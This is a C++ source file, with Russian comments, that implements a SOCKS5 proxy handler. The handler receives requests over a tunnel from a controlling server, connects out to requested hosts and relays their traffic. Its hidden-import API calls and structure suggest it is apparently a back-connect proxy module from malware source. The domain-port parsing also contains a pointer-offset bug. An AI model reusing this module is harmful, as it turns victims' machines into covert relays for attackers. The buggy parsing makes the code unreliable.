#include "core\core.h"
#include "WndRec\sender.h"
#include "WndRec\manager.h"
#include "WndRec\tunnel.h"
#include "core\debug.h"
#include "core\socket.h"

namespace WndRec
{

#pragma pack(1)

//после заголовка идут одна из структур Sock5Header или SocksHeader, или простой масив данных
struct Sock5Header
{
	BYTE ver;
	BYTE numMethods;
	BYTE methods[256];
};

struct SocksHeader
{
	BYTE ver;
	union
	{
		BYTE cmd; //команда при приеме пакета
		BYTE rep; //ответ при отправке пакета
	};
	BYTE rsv;
	BYTE addrType;
	union
	{
		struct
		{
			struct in_addr ip;
			unsigned short port;
			char sots[250];
		} ip4;
		struct 
		{
			BYTE lenDomen;
			char domen[255];
		} host;
	} addr;
};

#pragma pack()

static int SocksProtocolHandler( ServerData* server, SocketId* si, char* data, int szData, char* createData, int szCreate )
{
	SocksHeader* sh = (SocksHeader*)data;
	int ret = 1;
	if( sh->ver == 0x05 )
	{
		if( si->val ==  0 ) //сначала идет выбор метода идентификации
		{
			data[1] = 0;
			szData = 2;
			si->val = 1;
			ret = 2;
		}
		else if( sh->cmd == 0x01 )
		{
			in_addr ip;
			int port = 0;
			sh->rep = 0;
			if( sh->addrType == 0x01 ) //коннект по IP адресу
			{
				ip = sh->addr.ip4.ip;
				port = API(WS2_32, ntohs)( sh->addr.ip4.port );
			}
			else
				if( sh->addrType == 0x03 ) //коннект с доменом
				{
					char domen[256];
					Mem::Copy( domen, sh->addr.host.domen, sh->addr.host.lenDomen );
					domen[sh->addr.host.lenDomen] = 0;
					DbgMsg( "Socks5 connect domen: %s", domen );
					port = API(WS2_32, htons)( *((unsigned short*)sh->addr.host.domen + sh->addr.host.lenDomen) );
					hostent* host = API(WS2_32, gethostbyname)(domen);
					if( host )
						ip = *((in_addr*)host->h_addr);
					else
						sh->rep = 0x04; //домен не доступен
				}
			if( sh->rep == 0 )
			{
				Str::Copy( si->ip, API(WS2_32, inet_ntoa)(ip) );
				si->port = port;
				DbgMsg( "Socks5 connect with %s:%d", si->ip, port );
				SOCKET s = Socket::ConnectIP( si->ip, port);
				if( s > 0 )
				{
					sockaddr_in sa;
					int c_sa = sizeof(sa);
					Mem::Zero(sa);
					if( !API(WS2_32, getsockname)( s, (sockaddr*)&sa, &c_sa ) )
					{
						//после коннекта, указываем с каким айпи соединились
						sh->addrType = 0x01;
						sh->addr.ip4.ip.S_un.S_addr = sa.sin_addr.S_un.S_addr;
						sh->addr.ip4.port = sa.sin_port;
						si->sc = s;
						ret = 0; 
						si->type = 1; //протокольные данные отработаны, дальше будут идти только данные,
									//отсылаемые напрямую
					}
					else
					{
						sh->rep = 0x04;
						API(WS2_32, closesocket)(s);
					}
				}
				else
					sh->rep = 0x04;
			}
		}
	}
	else
		sh->rep = 0x07; //ошибка: команда не поддерживается
	SendProtocolData( server, si, ID_SOCKS, data, szData );
	return ret;
}

bool StartSocks( ServerData* server )
{
	DbgMsg( "Start socks5" );
	return StartTunnel( server, ID_SOCKS, SocksProtocolHandler );
}

bool StopSocks( ServerData* server )
{
	DbgMsg( "Stop socks5" );
	StopTunnel( server, ID_SOCKS );
	return true;
}

}
